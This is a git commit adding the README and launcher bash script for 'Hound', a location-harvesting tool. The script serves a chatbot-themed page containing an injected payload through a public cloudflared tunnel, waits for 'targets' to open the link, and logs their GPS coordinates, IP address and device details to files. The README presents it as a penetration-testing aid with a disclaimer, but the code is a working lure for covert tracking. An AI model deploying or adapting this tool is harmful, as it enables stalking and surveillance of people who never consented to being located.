1aaa54536dbaf2671d9489f897a953a676177b36
Masterdas <123380450+Masterdas@users.noreply.github.com>
2025-03-16 09:01:59 +0530

    Add files via upload

---
+++ README.md
@@ -0,0 +1,50 @@
+# hound New Update 2025 🐶
+Hound is a simple and light tool for information gathering and capture exact GPS coordinates
+![image](https://raw.githubusercontent.com/Mouse99-tech/Photo/refs/heads/main/20250316_085541.png)
+
+# What is Hound?
+<p>Hound is a tool that can remotely capture the exact GPS coordinates of a target device using a PHP server, and can also grab basic information about the system and ISP. This tool can be very helpful in information gathering. you can get following information of the target device</p>
+<ul>
+  <li>Longitude</li>
+  <li>Latitude</li>
+  <li>Device Model</li>
+  <li>Operating System</li>
+  <li>Number of CPU Cores</li>
+  <li>Screen Resolution</li>
+  <li>User agent</li>
+  <li>Public IP Address</li>
+  <li>Browser Name</li>
+  <li>ISP Information</li>
+</ul>
+
+## Features
+  <p>The tool offers a wide range of features and functionality, including:</p>
+    <ul>
+  <li>Capture Exact GPS Location</li>
+  <li>Automated Data Collection</li>
+   <li>User-friendly Interface</li>
+</ul>
+
+## Installing and requirements
+<p>This tool require PHP for webserver, wget & unzip for download and extract cloudflare. First run following command on your terminal</p>
+
+```
+apt-get -y install php unzip git wget
+```
+
+## Installing (Update 2025/Termux):
+
+```
+git clone https://github.com/Masterdas/location.git
+cd location
+bash location.sh
+```
+## Change log:
+Version: 1.0: Remove Ngrok and update cloudflared tunnel
+
+### Video Demo
+[![Hound Demo](https://img.youtube.com/vi/IiJRyVmITgI/0.jpg)](https://www.youtube.com/channel/UC8HzoXx8S4IVGRh62zb-8Ow)
+
+### For More Video subcribe <a href="http://youtube.com/techchipnet">TechChip YouTube Channel</a>
+<p>Hound is created to help in penetration testing and it's not responsible for any misuse or illegal purposes.</p>
+credit - Chatbot template : Masud Rana
---
+++ location.sh
@@ -0,0 +1,133 @@
+#!/bin/bash
+# Masterdas Update 2025
+# Powered by TechChip mode by Mahadeb
+# © AppShakti Bangla 
+# visit https://youtube.com/appshaktibangla
+
+trap 'printf "\n";stop' 2
+
+banner() {
+clear
+printf "\e[1;92m=======================================================\e[0m\n"
+printf "\e[1;96m           🚀 Welcome to my project Script 🚀      \e[0m\n"
+printf "\e[1;92m=======================================================\e[0m\n"
+printf "\e[1;93m           🔥 Powered by AppShakti Bangla 🔥      \e[0m\n"
+printf "\e[1;92m=======================================================\e[0m\n\n"
+printf "\e[1;91m YouTube link=>\e[1;95m https://youtube.com/@appshaktibangla\e[0m\n\n"
+printf "\e[1;92m=======================================================\e[0m\n\n"
+}
+
+dependencies() {
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 
+
+}
+
+stop() {
+checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkcf == *'cloudflared'* ]]; then
+pkill -f -2 cloudflared > /dev/null 2>&1
+killall -2 cloudflared > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+}
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+cat ip.txt >> saved.ip.txt
+
+}
+
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+tail -f -n 110 data.txt
+fi
+sleep 0.5
+done 
+}
+
+
+cloudflare_tunnel() {
+rm -f cf_tunnel.log
+
+if command -v cloudflared &> /dev/null
+then
+    echo ""
+else
+    echo "Installing Cloudflared..."
+    pkg update -y
+    pkg install -y cloudflared
+
+    echo "Cloudflared installation complete."
+fi
+
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+cloudflared tunnel --url http://localhost:3333 --no-autoupdate > cf_tunnel.log 2>&1 &
+
+sleep 10
+link=$(grep -o 'https://[^ ]*\.trycloudflare.com' cf_tunnel.log | head -n 1)
+
+if [[ -z "$link" ]]; then
+    printf "\e[1;31m[!] Cloudflare Tunnel Failed, Check Your Internet!\e[0m\n"
+    exit 1
+else
+    printf "\e[1;92m[+] Cloudflare Link:\e[0m \e[1;77m%s\e[0m\n" $link
+fi
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+checkfound
+}
+
+local_server() {
+sed 's+forwarding_link+''+g' template.php > index.php
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080 ...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Localhost URL http://127.0.0.1:8080 \n"
+php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
+sleep 2
+checkfound
+}
+Masterdas() {
+if [[ -e data.txt ]]; then
+cat data.txt >> targetreport.txt
+rm -rf data.txt
+touch data.txt
+fi
+if [[ -e ip.txt ]]; then
+rm -rf ip.txt
+fi
+sed -e '/tc_payload/r payload' index_chat.html > index.html
+default_option_server="Y"
+read -p $'\n\e[1;93m Do you want to use Yes/y cloudflared tunnel?\n \e[1;92m Type N run localhost:8080 [default Y] \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
+cloudflare_tunnel
+sleep 1
+else
+local_server
+sleep 1
+fi
+}
+
+banner
+dependencies
+Masterdas
